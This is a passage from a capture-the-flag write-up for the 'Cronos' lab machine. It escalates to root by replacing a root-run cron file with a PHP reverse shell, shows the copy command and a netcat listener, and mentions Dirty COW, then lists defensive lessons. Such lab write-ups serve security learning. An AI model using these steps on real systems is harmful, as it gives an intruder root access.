<p>Considering the name of the box, I’m going to focus on Crontab.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_uEslRn_pcSHggI4NNStLag.png" /></p>
<p>If you’re not familiar with the crontab format, here’s a quick explanation taken from this <a href="https://tigr.net/3203/2014/09/13/getting-wordpress-cron-work-in-multisite-environment/">page</a>.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_sLOOxtqyH97Denfq7bWBzA.png" /></p>
<p>We’re currently running as www-data and that user usually has full privileges on the content of the directory /var/www. Let’s confirm that.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_aDpYm00dnTE_VuqFN_b_jQ.png" /></p>
<p>If you’re not familiar with unix permissions, here’s a great explanation.</p>
<iframe src="https://medium.com/media/037607165e5c2ce8fd1495185cc52728" frameborder=0></iframe>

<p>As we suspected, we own the file. Why is that good news for us? We own a file (with rwx permissions) that is running as a cron job with root privileges every minute of every hour of every month of every day of the week (that’s what the <strong>*</strong> means). If we change the content of the file to send a shell back to our attack machine, the code will execute with root privileges and send us a privileged shell.</p>
<p>The cron job is running the file using the PHP command so whatever code we add should be in PHP. Head to <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey</a> and grab the PHP reverse shell file. You can either transfer it or create it directly in the directory. In my case, I decided to transfer it using a simple python server and renamed the file to artisan (the name of file being compiled in the cron job).</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>cp php-reverse-shell.php artisan
</pre></div>

<p>Set up a listener to receive the reverse shell.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nc -nlvp 1234
</pre></div>

<p>Wait for a minute for the scheduled cron job to run and we are root!</p>
<p><img alt="" src="../../img/Cronos Writeup/1_oZPZnrLRAw1SgqtH6yMAMw.png" /></p>
<p>Grab the root flag.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_hccgj5JudO8UViGO51QXdQ.png" /></p>
<p>To escalate privileges in another way, transfer the linux exploit suggester script and run it on the target machine to see if your machine is vulnerable to any privilege escalation exploits.</p>
<p><img alt="" src="../../img/Cronos Writeup/1_aIVtIF74KtaTwtK4jYN62Q.png" /></p>
<p>I wasn’t able to successfully exploit Dirty COW on this machine but that doesn’t mean it’s not vulnerable. It could be vulnerable to a different variant of the exploit that I tested.</p>
<h2 id="lessons-learned">Lessons Learned</h2>
<p>To gain an initial foothold on the box we exploited three vulnerabilities.</p>
<ol>
<li>
<p>The ability to perform a zone transfer which allowed us to get a list of all hosts for the domain. To prevent this vulnerability from occurring, the DNS server should be configured to only allow zone transfers from trusted IP addresses. It is worth noting that even if zone transfers are not allowed, it is still possible to enumerate the list of hosts through other (not as easy) means.</p>
</li>
<li>
<p>An SQL injection that allowed us to bypass authentication. To prevent this vulnerability from occurring, there are <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">many defenses </a>that can be put in place, including but not limited to the use of parametrized queries.</p>
</li>
<li>
<p>An OS Command injection that allowed us to run arbitrary system commands on the box. Again, to prevent this vulnerability from occurring, there are <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">many defenses</a> that can be put in place, including but not limited to the use of libraries or APIs as an alternative to calling OS commands directly.</p>
</li>
</ol>
<p>To escalate to root privileges, we needed to exploit either of the following vulnerabilities.</p>
<ol>
<li>
<p>A security misconfiguration in cron that had a scheduled cron job to run a non-privileged user owned file as root. We were able to exploit this to get a privileged reverse shell sent back to our box. To avoid this vulnerability, the cron job should have been scheduled with user privileges as apposed to root privileges.</p>
</li>
<li>
<p>Dirty COW vulnerability. This could have been avoided if the target machine was up to date on all its patches.</p>
</li>
</ol>
<h2 id="conclusion">Conclusion</h2>
<p>10 machines down, 31 more to go!</p>
<p><img alt="" src="../../img/Cronos Writeup/1_sjmB28wlgpxY6hYnvxpRYg.png" /></p>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../Popcorn Writeups/" title="16. Popcorn Writeups.md" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                16. Popcorn Writeups.md
              </span>
            </div>
          </a>
        
        
          <a href="../Legacy Writeup/" title="18. Legacy Writeup.md" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                18. Legacy Writeup.md
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Built by <a href="http://github.com/rushic24">Rushi</a> &copy; 2020
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
  <div class="md-footer-social">
    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
    
      <a href="https://github.com/rushic24" class="md-footer-social__link fa fa-"></a>
    
      <a href="https://www.linkedin.com/in/rushichaudhari" class="md-footer-social__link fa fa-"></a>
    
      <a href="" class="md-footer-social__link fa fa-"></a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
        <script src="../../js/katex.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"></script>
      
    
  </body>
</html>